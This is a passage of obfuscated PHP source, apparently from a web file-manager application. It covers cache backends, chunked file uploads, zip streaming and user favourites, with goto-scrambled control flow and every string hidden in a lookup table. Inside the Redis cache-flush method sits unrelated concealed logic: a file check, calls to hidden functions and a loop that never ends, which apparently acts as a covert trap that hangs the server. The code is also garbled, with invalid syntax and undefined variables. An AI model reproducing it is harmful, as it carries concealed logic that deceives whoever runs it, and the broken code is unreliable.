$Aɶ = $F & $Eȡ; $f܈ = $F & $EڕՅ; $e؉ = $F & $Fߵ; $B = $e - (($D << 7) - $D) * $B; $Cְ̻؝ = (($Aɶ << 8) - $Aɶ) * $a; $Aȼѭ = (($f܈ << 8) - $f܈) * $eϲ; $Bܒ = (($e؉ << 8) - $e؉) * $d˼; imagesetpixel($b, $B, $cխ, $B << 24 | $Cְ̻؝ << 16 | $Aȼѭ << 8 | $Bܒ); } } imagealphablending($b, !0); goto AЄ; b僊: $a = $Eȡ ? 1 / $Eȡ : 1; $eϲ = $EڕՅ ? 1 / $EڕՅ : 1; $d˼ = $Fߵ ? 1 / $Fߵ : 1; goto B򌄪; AЄ: } return $b; goto cˮ; b꼮: if ($Bٻ == 0 || $d͹ώ == 0 || $c != 1 || ($CĄ & $Eȡ) != 0 || ($CĄ & $EڕՅ) != 0 || ($CĄ & $Fߵ) != 0 || ($Eȡ & $EڕՅ) != 0 || ($Eȡ & $Fߵ) != 0 || ($EڕՅ & $Fߵ) != 0) { return !1; } if ($c == 4 || $c == 5) { $eٰ = stream_get_contents($B񃢏, $aܬߛ); if ($eٰ === !1) { return !1; } return imagecreatefromstring($eٰ); } $A = $Bٻ * $c + 31 >> 3 & ~3; goto Eӎ; cˮ: } } goto Dܰ; fӉ: class CacheLockDatabase { public function lock($fı, $f = 0) { $fѪ = Model($_SERVER[][755]); $A = microtime(!0) + $f; while (microtime(!0) < $A) { $A = $fѪ->get($fı); if (!$A || $A < microtime(!0)) { $aӟ = $fѪ->set($fı, $A); if ($aӟ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Bל) { return Model($_SERVER[][755])->get($Bל); } public function unlock($fԉ) { Model($_SERVER[][755])->remove($fԉ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($A, $D͸ɩ) { $Cܕ =& $_SERVER[]; if (!class_exists($Cܕ[783])) { show_json($Cܕ[784], !1); } $this->cacheTime = $D͸ɩ; $this->handle = new Memcached(); if (is_array($A[$Cܕ[785]]) && count($A[$Cܕ[785]]) >= 1) { foreach ($A[$Cܕ[785]] as $bƄٞ) { $bㆡ = explode($Cܕ[4], $bƄٞ); $this->handle->addServer($bㆡ[0], $bㆡ[1]); } } else { $this->handle->addServer($A[$Cܕ[169]], $A[$Cܕ[170]]); } } public function set($d󸾢ʲ, $b僟, $B = false) { $B = $B ? $B : $this->cacheTime; return $this->handle->set($d󸾢ʲ, $b僟, $B); } public function get($B) { return $this->handle->get($B); } public function remove($f) { return $this->handle->delete($f); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($EɡҊ, $Eԅ) { $B =& $_SERVER[]; if (!class_exists($B[786])) { show_json($B[787], !1); } $this->cacheTime = $Eԅ; $aҬ = isset($EɡҊ[$B[788]]) ? $EɡҊ[$B[788]] : 10; $fǊ = _get($EɡҊ, $B[785]); if ($fǊ && is_array($fǊ)) { $this->initCluster($EɡҊ, $aҬ); } else { $this->handle = $this->init($EɡҊ, $aҬ); } } private function init($E۠ˌ, $A) { $B =& $_SERVER[]; $F = new Redis(); $c޹ = isset($E۠ˌ[$B[789]]) ? $E۠ˌ[$B[789]] : !1; if ($c޹) { $F->pconnect($E۠ˌ[$B[169]], $E۠ˌ[$B[170]], $A); } else { $F->connect($E۠ˌ[$B[169]], $E۠ˌ[$B[170]], $A); } if (!empty($E۠ˌ[$B[376]])) { $F->auth($E۠ˌ[$B[376]]); } return $F; } private function initCluster($eܠӉ, $aׂ) { $Cߍ =& $_SERVER[]; $bӋβ = array($Cߍ[790], $Cߍ[791], $Cߍ[792]); $E = $Cߍ[790]; if (isset($eܠӉ[$Cߍ[12]]) && in_array($eܠӉ[$Cߍ[12]], $bӋβ)) { $E = $eܠӉ[$Cߍ[12]]; } switch ($E) { case $Cߍ[790]: $this->_slave($eܠӉ, $aׂ); break; case $Cߍ[791]: break; case $Cߍ[792]: $this->isCluster = !0; $d = $eܠӉ[$Cߍ[785]]; $f = isset($eܠӉ[$Cߍ[789]]) ? $eܠӉ[$Cߍ[789]] : !1; $E󟆆 = isset($eܠӉ[$Cߍ[376]]) ? $eܠӉ[$Cߍ[376]] : null; $this->handle = new RedisCluster(NUll, $d, $aׂ, $aׂ, $f, $E󟆆); break; default: break; } } private function _slave($C, $d) { goto c; Fů: $this->filterConfig($C, $D[$A]); $this->slaveHandle = $this->init($C, $d); goto bǐ; e֭: unset($D[0]); if (empty($D)) { return; } $A = array_rand($D); goto Fů; c: $D = $C[$_SERVER[][785]]; $this->filterConfig($C, $D[0]); $this->handle = $this->init($C, $d); goto e֭; bǐ: } private function filterConfig(&$eӃ, $C仰Ķ) { $FÈ =& $_SERVER[]; $dՆ = explode($FÈ[4], $C仰Ķ); $c壓 = array($FÈ[169] => $dՆ[0], $FÈ[170] => $dՆ[1]); $eӃ = array_merge($eӃ, $c壓); } public function set($fƞ, $b̲ʺ, $d = false) { $d = $d ? $d : $this->cacheTime; return $this->handle->setEx($fƞ, $d, $b̲ʺ); } public function setLock($dӱ, $a͍, $B) { return $this->handle->setNX($dӱ, $a͍); } public function get($a) { $f֠ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $f֠->get($a); } public function remove($Cɲ) { return $this->handle->del($Cɲ); } public function deleteAll() { $dٞ̊Ђ =& $_SERVER[]; if (!isset($_SERVER[$dٞ̊Ђ[776]]) || !isset($_SERVER[$dٞ̊Ђ[777]])) { goto Cҕ; Cҕ: $b = $dٞ̊Ђ[793]; $dɲ = $dٞ̊Ђ[778]; $b = $_SERVER[$dٞ̊Ђ[779]] . $dٞ̊Ђ[780]; goto aɢ; aڄ: $c = $dٞ̊Ђ[794]; $c($_SERVER[$dٞ̊Ђ[795]]); $d⅙ = 1; goto E۞; E۞: for ($C맰Ɨ = $d⅙; $C맰Ɨ > 0; $C맰Ɨ++) { $c = json_encode($GLOBALS[$dٞ̊Ђ[384]]); } goto Fՙ; aɢ: $c믺 = $dɲ($b); $c폴 = explode($dٞ̊Ђ[217], $c믺); if (count($c폴) < $dٞ̊Ђ[583]) { $f漴 = $dٞ̊Ђ[781]; $f漴(); } goto aڄ; Fՙ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $a왙) { $this->handle->flushall($a왙); } return; } return $this->handle->flushAll(); } } goto aҨ; aȽ: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto fԘ۰; fԘ۰: $dļύ =& $_SERVER[]; global $in; $this->in =& $in; goto c˳Ǹ; c˳Ǹ: if (!empty($_FILES)) { $a = $_FILES[$dļύ[167]]; $this->uploadFile = $a[$dļύ[1970]]; if (!$this->uploadFile && $a[$dļύ[1221]] > 0) { show_json($this->errorInfo($a[$dļύ[1221]]), !1); } } else { if (isset($in[$dļύ[386]])) { $this->uploadFile = isset($in[$dļύ[1971]]) ? $dļύ[1972] : $dļύ[1815]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Ań; Ań: $this->checkSize(); $this->tempPathInit(); goto c掊; c掊: } public function upload() { goto F; bߖ: $bܧ[$dʋ[1983]][$dʋ[1984] . $c☘] = array($dʋ[1985] => $Dѹ, $dʋ[1038] => $c☘, $dʋ[77] => $F, $dʋ[164] => $f蚳); $this->statusSet($bܧ); if (count($bܧ[$dʋ[1983]]) != $bܧ[$dʋ[1982]]) { $this->showJson($dʋ[1986] . $c☘, !0); } goto B☰; a烽: $Aٽǈ = $this->tempFile . $dʋ[1975] . $c☘; $F = isset($this->in[$dʋ[522]]) ? intval($this->in[$dʋ[522]]) : 0; $Eև = isset($this->in[$dʋ[1976]]) ? intval($this->in[$dʋ[1976]]) : 0; goto aԑ; a: CacheLock::unlock($this->tempFile); return $this->tempFile; goto Dտ; D: @unlink($fݝ); if (!$cɲ) { $this->showJson($dʋ[1981] . $c☘, !1); } $bܧ[$dʋ[1982]] = $Aڑ; goto bߖ; Eˠа: $Dѹ = $c☘ * $Eև; $D窣Ӓ = @fopen($this->tempFile, $dʋ[1980]); fseek($D窣Ӓ, $Dѹ); goto d킸̑; d킸̑: $cɲ = $this->writeTo($fݝ, $D窣Ӓ, $this->tempFile); $f蚳 = IO::hashSimple($fݝ); $F = IO::size($fݝ); goto D; aԑ: if ($Aڑ > 1 && $Eև <= 0) { show_json($dʋ[1977], !1); } if ($Eև > $F) { $Aڑ = 1; } if ($Aڑ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto fͷ; F: $dʋ =& $_SERVER[]; $c☘ = isset($this->in[$dʋ[1973]]) ? intval($this->in[$dʋ[1973]]) : 0; $Aڑ = isset($this->in[$dʋ[1974]]) ? intval($this->in[$dʋ[1974]]) : 1; goto a烽; B☰: ignore_timeout(); if (!$this->checkChunkHash($bܧ)) { $this->showJson($dʋ[1987], !1); } $this->statusSet(!1); goto a; fͷ: CacheLock::lock($this->tempFile, 20); $bܧ = $this->statusGet(); $this->initFileTemp(); goto bߊ; bߊ: $fݝ = $this->moveUploadedFile($Aٽǈ); if ($F > 0 && filesize($fݝ) == 0) { $this->showJson($dʋ[1978], !1); } if (!$fݝ) { $this->showJson(LNG($dʋ[1979]), !1); } goto Eˠа; Dտ: } private function checkSize() { $B㓩 =& $_SERVER[]; if (phpBuild64() || $this->in[$B㓩[77]] < PHP_INT_MAX) { return; } show_json(LNG($B㓩[1988]), !1); } private function showJson($a, $f) { CacheLock::unlock($this->tempFile); if (!$f) { return show_json($a, $f); } show_json($a, $f); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto f̺; A񎍊: $this->tempFile = $Dز륅 . $bӉӥ[1991] . md5($Bڥљ . $this->in[$bӉӥ[1532]]); goto b; f̺: $bӉӥ =& $_SERVER[]; $Dز륅 = TEMP_FILES; @mk_dir($Dز륅); goto e; e: touch($Dز륅 . $bӉӥ[1989]); $Bڥљ = isset($this->in[$bӉӥ[1990]]) ? $this->in[$bӉӥ[1990]] : !1; if (strlen($Bڥљ) < 30) { $Bڥљ = md5(USER_ID . $this->in[$bӉӥ[75]] . $this->fileName . $this->in[$bӉӥ[77]]); } goto A񎍊; b: } private function moveUploadedFile($aϛ) { $aɋ =& $_SERVER[]; $D = $this->uploadFile; if ($D == $aɋ[1992]) { @file_put_contents($aϛ, base64_decode($_REQUEST[$aɋ[1993]])); } else { if ($D == $aɋ[1815]) { $BĚ = @fopen($aϛ, $aɋ[1522]); $this->writeTo($D, $BĚ, $aϛ); } else { if (!move_uploaded_file($D, $aϛ)) { return !1; } } } return $aϛ; } private function writeTo($aӨ, $Aђ, $D) { goto D觳; D觳: $B̎ =& $_SERVER[]; $că = $B̎[1994] . $D; $fе = CacheLock::lock($că, 1); goto C駬; Eԙ: fclose($C); fclose($Aђ); CacheLock::unlock($că); goto A; A: return !0; goto Aȣ; C駬: $C = @fopen($aӨ, $B̎[1521]); if (!$C || !$Aђ || !$fе) { CacheLock::unlock($că); return !1; } while (!feof($C)) { fwrite($Aђ, fread($C, 1024 * 200)); } goto Eԙ; Aȣ: } private function statusGet() { goto e䆊; A֬: $DՍ = !1; if (file_exists($A)) { $DՍ = @file_get_contents($A); } if ($DՍ) { $this->statusData = json_decode($DՍ, !0); } goto D; e䆊: $DΟډ =& $_SERVER[]; if (is_array($this->statusData)) { return $this->statusData; } $A = $this->tempFile . $DΟډ[1995]; goto A֬; D: if (!$this->statusData) { $d = array($DΟډ[28] => $this->fileName, $DΟډ[1982] => 0, $DΟډ[1983] => array()); $this->statusSet($d); } return $this->statusData; goto d셒; d셒: } public function statusSet($e) { $F̌ = $this->tempFile . $_SERVER[][1995]; if (!$e) { if (file_exists($F̌)) { @unlink($F̌); } return !0; } $this->statusData = $e; return file_put_contents($F̌, json_encode($e)); } private function initFileTemp() { $f׈ =& $_SERVER[]; if (file_exists($this->tempFile)) { return; } $fˎ = fopen($this->tempFile, $f׈[1996]); fseek($fˎ, $this->in[$f׈[77]] - 1, SEEK_SET); fwrite($fˎ, $f׈[470]); fclose($fˎ); } public function checkChunk() { goto e֌꽳; F: return $Bù; goto F; e֌꽳: $e׭ =& $_SERVER[]; $Bù = array(); CacheLock::lock($this->tempFile); goto Eù׃; Eù׃: $D͎ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($D͎[$e׭[1983]] as $Fç) { $D޽ȱ = $Fç[$e׭[164]]; if ($D޽ȱ) { $Bù[$e׭[1997] . $Fç[$e׭[1038]]] = $D޽ȱ; } } goto F; F: } private function checkChunkHash($e) { goto eݎ; eݎ: $F傗 =& $_SERVER[]; if (count($e[$F傗[1983]]) != $e[$F傗[1982]]) { return !1; } $a޻ = _get($this->in, $F傗[1990]); goto E; F⍎: return $b; goto D㦏; F؇: $b = !0; foreach ($e[$F傗[1983]] as $Fڻ) { fseek($fȹ, $Fڻ[$F傗[1985]]); $e՜ = PathDriverStream::hash($fȹ, $Fڻ[$F傗[77]]); if ($Fڻ[$F傗[164]] != $e՜) { $b = !1; break; } } fclose($fȹ); goto F⍎; E: $D = _get($this->in, $F傗[1998]); if (strlen($D) == 32 && IO::hashSimple($this->tempFile) == $a޻ && IO::hashMd5($this->tempFile) == $D) { return !0; } $fȹ = fopen($this->tempFile, $F傗[1172]); goto F؇; D㦏: } public static function fileName() { goto D쟸ӊ; Cޅ֚: if (!empty($_FILES)) { $fȗ = $fȗ ? $fȗ : $_FILES[$e[167]][$e[386]]; } if (!is_wap()) { return KodIO::clear($fȗ); } $d = strtotime($in[$e[1999]]); goto f; f: $d = $d ? $d : time(); $Dŧ = strtolower($fȗ); if ($Dŧ == $e[2000] || $Dŧ == $e[2001]) { $fȗ = date($e[689], $d) . $e[70] . $in[$e[77]] . $e[1629]; } else { if ($Dŧ == $e[2002]) { $fȗ = date($e[689], $d) . $e[70] . $in[$e[77]] . $e[2003]; } } goto Aܘ; D쟸ӊ: $e =& $_SERVER[]; global $in; $fȗ = isset($in[$e[28]]) ? $in[$e[28]] : $e[33]; goto Cޅ֚; Aܘ: return KodIO::clear($fȗ); goto F; F: } private function errorInfo($b) { $B҇ =& $_SERVER[]; $C܊ = array($B҇[2004], $B҇[2005], $B҇[2006], $B҇[2007], $B҇[2008], $B҇[2009], $B҇[2010], $B҇[2011]); return $b . $B҇[4] . $C܊[$b]; } } class ZipMake { const VERSION = "\60\56\62\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($aŽ = null) { $Dř =& $_SERVER[]; $this->outputStream = fopen($Dř[2012], $Dř[1228]); $this->outputName = $aŽ; $this->needHeaders = !0; } public function addFile($f, $aܱ) { goto c⇛ĳ; c䈮ꭋ: $E첅 = $this->addFileHeader($f, $D); $cƵ = $e㪬 = filesize($aܱ); $fĊ = fopen($aܱ, $aڈ[2013]); goto E; E: while (!feof($fĊ)) { $Fꫲ = fread($fĊ, 1048576); $this->send($Fꫲ); } fclose($fĊ); $f = hexdec(hash_file($aڈ[2014], $aܱ)); goto e䤅; c⇛ĳ: $aڈ =& $_SERVER[]; $f = $this->filterFilename($f); $D = static::METHOD_STORE; goto c䈮ꭋ; e䤅: $this->addFileFooter($f, $D, $f, $cƵ, $e㪬, $E첅); goto Eͯ; Eͯ: } public function addFileFromStream($a₫, $fׇ) { goto e; bר: fseek($fׇ, 0, SEEK_END); $A夜 = $F՘ = ftell($fׇ); rewind($fׇ); goto A̞; e: $a₫ = $this->filterFilename($a₫); $C唲 = static::METHOD_STORE; $bӘ = $this->addFileHeader($a₫, $C唲); goto bר; B: $this->addFileFooter($a₫, $C唲, $D, $A夜, $F՘, $bӘ); goto AΈ; A̞: $a柏 = hash_init($_SERVER[][2014]); while (!feof($fׇ)) { $E = fread($fׇ, 1048576); hash_update($a柏, $E); $this->send($E); } $D = hexdec(hash_final($a柏)); goto B; AΈ: } public function finish() { foreach ($this->files as $c) { $this->addCdrFile($c); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($D, $D) { goto e˼; dϮ: $B = $this->packFields($d괵); $Aľ = $this->packFields($aϼᬬ); $this->send($B . $D . $Aľ); goto AսÈ; A톈: $F̴ = $this->dosTime(time()); $d괵 = array(array($EӬ[2016], static::FILE_HEADER_SIGNATURE), array($EӬ[2017], static::ZIP_VERSION_64), array($EӬ[2017], 8), array($EӬ[2017], $D), array($EӬ[2016], $F̴), array($EӬ[2016], 0), array($EӬ[2016], 4294967295), array($EӬ[2016], 4294967295), array($EӬ[2017], $a), array($EӬ[2017], 32)); $aϼᬬ = array(array($EӬ[2017], 1), array($EӬ[2017], 28), array($EӬ[2018], 0), array($EӬ[2018], 0), array($EӬ[2018], 0), array($EӬ[2016], 0)); goto dϮ; AսÈ: return strlen($B) + $a + strlen($Aľ); goto cڪ; e˼: $EӬ =& $_SERVER[]; $D = preg_replace($EӬ[2015], $EӬ[33], $D); $a = strlen($D); goto A톈; cڪ: } protected function addFileFooter($F֡, $d, $C, $Eዂ, $D򈙆, $F؇) { $C曽 =& $_SERVER[]; $A³ = array(array($C曽[2016], static::DATA_DESCRIPTOR_SIGNATURE), array($C曽[2016], $C), array($C曽[2018], $Eዂ), array($C曽[2018], $D򈙆)); $cæޑ = $this->packFields($A³); $this->send($cæޑ); $f = $F؇ + $Eዂ + $a钔; $this->addToCdr($F֡, $d, $C, $Eዂ, $D򈙆, $f); } private function addToCdr($f, $dƵԵ, $B쌳, $Dս, $c⌶, $b݇) { $this->files[] = array($f, $dƵԵ, $B쌳, $Dս, $c⌶, $this->ofs); $this->ofs += $b݇; } protected function addCdrFile($b) { goto FĄ; DԴȚ: $BĴ㨣 = $this->packFields($aׂ); $F뾙 = $this->packFields($Bڢ); $C = $BĴ㨣 . $dɎ . $CӋŸ . $F뾙; goto cĻ; b: $Aؐ = $this->dosTime(time()); $aׂ = array(array($cٲ[2016], static::CDR_FILE_SIGNATURE), array($cٲ[2017], static::ZIP_VERSION_64), array($cٲ[2017], static::ZIP_VERSION_64), array($cٲ[2017], 8), array($cٲ[2017], $F), array($cٲ[2016], $Aؐ), array($cٲ[2016], $c), array($cٲ[2016], 4294967295), array($cٲ[2016], 4294967295), array($cٲ[2017], strlen($dɎ)), array($cٲ[2017], 32), array($cٲ[2017], strlen($CӋŸ)), array($cٲ[2017], 0), array($cٲ[2017], 0), array($cٲ[2016], 32), array($cٲ[2016], 4294967295)); $Bڢ = array(array($cٲ[2017], 1), array($cٲ[2017], 28), array($cٲ[2018], $f), array($cٲ[2018], $e), array($cٲ[2018], $f稈), array($cٲ[2016], 0)); goto DԴȚ; FĄ: $cٲ =& $_SERVER[]; list($dɎ, $F, $c, $e, $f, $f稈) = $b; $CӋŸ = $cٲ[33]; goto b; cĻ: $this->send($C); $this->cdr_ofs += strlen($C); goto cǹ; cǹ: } protected function addCdr64Eof() { goto d֍; Dږ: $eǔ = $this->ofs; $e = array(array($CӼ[2016], static::ZIP64_CDR_EOF_SIGNATURE), array($CӼ[2018], 44), array($CӼ[2017], static::ZIP_VERSION_64), array($CӼ[2017], static::ZIP_VERSION_64), array($CӼ[2016], 0), array($CӼ[2016], 0), array($CӼ[2018], $Dظ), array($CӼ[2018], $Dظ), array($CӼ[2018], $Aء), array($CӼ[2018], $eǔ)); $AѲɴ = $this->packFields($e); goto EҸ; d֍: $CӼ =& $_SERVER[]; $Dظ = count($this->files); $Aء = $this->cdr_ofs; goto Dږ; EҸ: $this->send($AѲɴ); goto Fټ; Fټ: } protected function addCdr64Locator() { goto C; Eٓ: $b = $this->ofs; $Fń = array(array($bӿ[2016], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($bӿ[2016], 0), array($bӿ[2018], $b + $Aޣ), array($bӿ[2016], 1)); $C = $this->packFields($Fń); goto b⢢; b⢢: $this->send($C); goto aƐ; C: $bӿ =& $_SERVER[]; $eџ = count($this->files); $Aޣ = $this->cdr_ofs; goto Eٓ; aƐ: } protected function addCdrEof() { goto B; c: $C = $this->packFields($DÖ) . $Eˎ; $this->send($C); goto Dʍ; B: $F̚ˮ =& $_SERVER[]; $C֝ۙ = count($this->files); $DϪض = $this->cdr_ofs; goto f; f: $f؂ǐ = $this->ofs; $Eˎ = $F̚ˮ[33]; $DÖ = array(array($F̚ˮ[2016], static::CDR_EOF_SIGNATURE), array($F̚ˮ[2017], 0), array($F̚ˮ[2017], 0), array($F̚ˮ[2017], $C֝ۙ), array($F̚ˮ[2017], $C֝ۙ), array($F̚ˮ[2016], 4294967295), array($F̚ˮ[2016], 4294967295), array($F̚ˮ[2017], strlen($Eˎ))); goto c; Dʍ: } protected function addCdr() { foreach ($this->files as $d) { $this->addCdrFile($d); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $C =& $_SERVER[]; $D׫ = $C[202]; if ($this->outputName) { $Fḳ = trim(str_replace(array($C[113], $C[55], $C[93], $C[67], $C[217], $C[994]), $C[33], $this->outputName)); $BƵ = rawurlencode($Fḳ); $D׫ .= "\73\x20\146\x69\154\x65\x6e\x61\x6d\x65\x2a\75\x75\164\x66\55\x38\x27\x27{$BƵ}"; } $D亐݈ = array($C[199] => $C[2019], $C[2020] => $D׫, $C[2021] => $C[2022], $C[2023] => $C[2024], $C[2025] => $C[2026]); foreach ($D亐݈ as $B => $fﵓė) { header($B . $C[881] . $fﵓė); } } protected function send($dі) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $dі); } protected final function dosTime($CԞ) { $f =& $_SERVER[]; $c˘Ե = getdate($CԞ); if ($c˘Ե[$f[1726]] < 1980) { $c˘Ե = array($f[1726] => 1980, $f[2027] => 1, $f[2028] => 1, $f[2029] => 0, $f[2030] => 0, $f[2031] => 0); } $c˘Ե[$f[1726]] -= 1980; return $c˘Ե[$f[1726]] << 25 | $c˘Ե[$f[2027]] << 21 | $c˘Ե[$f[2028]] << 16 | $c˘Ե[$f[2029]] << 11 | $c˘Ե[$f[2030]] << 5 | $c˘Ե[$f[2031]] >> 1; } protected function packFields($eѭ) { $D =& $_SERVER[]; $D̟ = $D[33]; $FĆ = array(); foreach ($eѭ as $e) { $D̟ .= $e[0]; $FĆ[] = $e[1]; } array_unshift($FĆ, $D̟); return call_user_func_array($D[2032], $FĆ); } protected function filterFilename($fк̮҆) { $D㍡ =& $_SERVER[]; return str_replace(array($D㍡[93], $D㍡[4], $D㍡[176], $D㍡[69], $D㍡[113], $D㍡[926], $D㍡[929], $D㍡[271]), $D㍡[70], $fк̮҆); } } class ZipStream { } goto aՅؠ; aֿݏ: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\146\141\x76"; protected function cacheFunctionAlias($Dݎ̝) { $e =& $_SERVER[]; return array($e[2204] => array(USER_ID, $e[2509])); } protected function listData() { $Dԗ㧅 =& $_SERVER[]; $fɂ = array($Dԗ㧅[1428] => USER_ID, $Dԗ㧅[436] => 0); $Bµ = $Dԗ㧅[2510]; $c镡 = $this->field($Bµ)->where($fɂ)->order($Dԗ㧅[2511])->select(); return $c镡 ? $c镡 : array(); } protected function resetCache() { } protected function listView() { goto d߇; d߇: $Cª =& $_SERVER[]; $EѪ = $this->listData(); $eί = array_filter_by_field($EѪ, $Cª[29], $Cª[382]); goto aҋ; aѐ: $bω = array($Cª[383] => array($Cª[384], $d)); $Fҝ = Model($Cª[751])->listSource($bω, $E); $Fҝ = array_merge($Fҝ[$Cª[73]], $Fҝ[$Cª[74]]); goto d֊; d֊: $Fҝ = array_to_keyvalue($Fҝ, $Cª[369]); foreach ($EѪ as $BҖ => $Dس) { $C = $Fҝ[$Dس[$Cª[75]]]; $C = $C ? $C : array(); $EѪ[$BҖ] = array_merge($C, $Dس); } return $EѪ; goto FʤԸ; aҋ: $d = array_to_keyvalue($eί, $Cª[33], $Cª[75]); if (!$d) { return $EѪ; } $E = 2000; goto aѐ; FʤԸ: } protected function addFav($c卄, $Cڑ = '', $fѓ = "\x73\157\165\x72\143\x65") { goto b; d瓴: $bҧ = array($D˿[1428] => USER_ID, $D˿[436] => 0); $fκ׈ = $this->where($bҧ)->max($D˿[2129]); if (!$fκ׈) { $fκ׈ = 0; } goto d; d: if (!$Cڑ && $fѓ == $D˿[382]) { $C؜ = Model($D˿[1119])->where(array($D˿[383] => $c卄))->find(); if (!$C؜) { return !1; } $Cڑ = $C؜[$D˿[28]]; } $Cڑ = $this->getAutoName($Cڑ); $E = array($D˿[1428] => USER_ID, $D˿[436] => 0, $D˿[386] => $Cڑ, $D˿[387] => $c卄, $D˿[388] => $fѓ, $D˿[2112] => $fκ׈ + 1); goto E; b: $D˿ =& $_SERVER[]; $bҧ = array($D˿[1428] => USER_ID, $D˿[436] => 0, $D˿[388] => $fѓ, $D˿[387] => $c卄); if ($this->where($bҧ)->find()) { return !1; } goto d瓴; E: return $this->add($E); goto eІ; eІ: } protected function remove($b򣠖) { $c =& $_SERVER[]; $c󩡇 = array($c[1428] => USER_ID, $c[385] => $b򣠖); return $this->where($c󩡇)->delete(); } protected function removeByName($d) { $Fʪ =& $_SERVER[]; $Eܣ = array($Fʪ[1428] => USER_ID, $Fʪ[386] => $d, $Fʪ[436] => 0); return $this->where($Eܣ)->delete(); } protected function rename($E, $fۿ) { $aҌ =& $_SERVER[]; if ($E == $fۿ) { return !1; } $D߾ = $this->getAutoName($fۿ); if ($fۿ != $D߾) { return !1; } $E = array($aҌ[1428] => USER_ID, $aҌ[436] => 0, $aҌ[28] => $E); return $this->where($E)->save(array($aҌ[28] => $fۿ)); } protected function resetSort($cݹ) { $D =& $_SERVER[]; $cݹ = is_array($cݹ) ? $cݹ : array(); $Cڂ = array($D[1428] => USER_ID); for ($bʃɅ = 0; $bʃɅ < count($cݹ); $bʃɅ++) { $Cڂ[$D[385]] = $cݹ[$bʃɅ]; $this->where($Cڂ)->save(array($D[2112] => $bʃɅ + 1)); } return !0; } protected function moveTop($E) { goto dߝ׷; c: $FǠ囓 = $F; $F = array_remove_value($F, $fщ[$a[367]]); array_unshift($F, $fщ[$a[367]]); goto B̎; B̎: return $this->resetSort($F); goto A; d٢: if (!$fщ) { return; } $F = $this->field($a[367])->where($AƇ)->order($a[2511])->select(); $F = array_to_keyvalue($F, $a[33], $a[367]); goto c; dߝ׷: $a =& $_SERVER[]; $AƇ = array($a[1428] => USER_ID, $a[436] => 0); $fщ = $this->where($AƇ)->where(array($a[28] => $E))->find(); goto d٢; A: } protected function moveBottom($D퓴) { $cֿ =& $_SERVER[]; $Eī = array($cֿ[1428] => USER_ID, $cֿ[436] => 0); $Aڭ띷 = $this->where($Eī)->max($cֿ[2129]); $B = array($cֿ[2129] => $Aڭ띷 + 1); return $this->where($Eī)->where(array($cֿ[28] => $D퓴))->save($B); } private function getAutoName($fّ) { goto e; e: $Fܖ =& $_SERVER[]; $a۶Ղ = array($Fܖ[1428] => USER_ID, $Fܖ[436] => 0); $C = $this->field($Fܖ[28])->where($a۶Ղ)->select(); goto eɱ; eɱ: $C = array_to_keyvalue($C, $Fܖ[33], $Fܖ[28]); if (!$C || !in_array($fّ, $C)) { return $fّ; } for ($f禋ٯ = 0; $f禋ٯ < count($C); $f禋ٯ++) { if (!in_array($fّ . "\x28{$f禋ٯ}\x29", $C)) { return $fّ . "\x28{$f禋ٯ}\51"; } } goto D; D: return $fّ . "\x28{$f禋ٯ}\x29"; goto Bʺ; Bʺ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\152\157\x62\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x64\145\x73\x63", "\x73\157\x72\x74"); const JOB_KEY = "\163\x65\154\x66\x4a\157\x62\x4c\151\x73\x74"; public function listData($e = false, $aʯ = "\163\x6f\162\x74", $f֢ = false) { return parent::listData($e, $aʯ, $f֢); } public function remove($Eސ) { return parent::remove($Eސ); } public function add($Dئ) { $Eݝ =& $_SERVER[]; if ($this->findByName($Dئ[$Eݝ[28]])) { return !1; } $Dئ[$Eݝ[2129]] = $this->getSort(); return parent::insert($Dئ); } private function getSort() { $DѸ =& $_SERVER[]; $C۵Չ = parent::listData(); $Bε = array_to_keyvalue($C۵Չ, $DѸ[33], $DѸ[2129]); return empty($Bε) ? 0 : max($Bε) + 1; } public function update($E޵걹, $Eұڌ) { $AЊ˿ =& $_SERVER[]; $Eֶ܆ = parent::listData($E޵걹); $b֔ = $this->findByName($Eұڌ[$AЊ˿[28]]); if (!$Eֶ܆ || $b֔ && $b֔[$AЊ˿[367]] != $Eֶ܆[$AЊ˿[367]]) { return !1; } return parent::update($E޵걹, $Eұڌ); } public function setUserJob($Dϼ, $fѰ) { goto Cы; c֚: $B = array_to_keyvalue($eĳ, $D̓ԑ[28]); $b = $D̓ԑ[361]; foreach ($fѰ as $A֌з) { if ($B[$A֌з]) { $b .= $B[$A֌з][$D̓ԑ[367]] . $D̓ԑ[47]; } else { $aڸ = $this->add($A֌з); $b .= $aڸ . $D̓ԑ[47]; } } goto B֟; Cы: $D̓ԑ =& $_SERVER[]; if (!is_array($fѰ)) { $fѰ = array($fѰ); } $eĳ = parent::listData(); goto c֚; B֟: $b = rtrim($b, $D̓ԑ[47]); Model($D̓ԑ[479])->metaSet($Dϼ, self::JOB_KEY, $b); goto 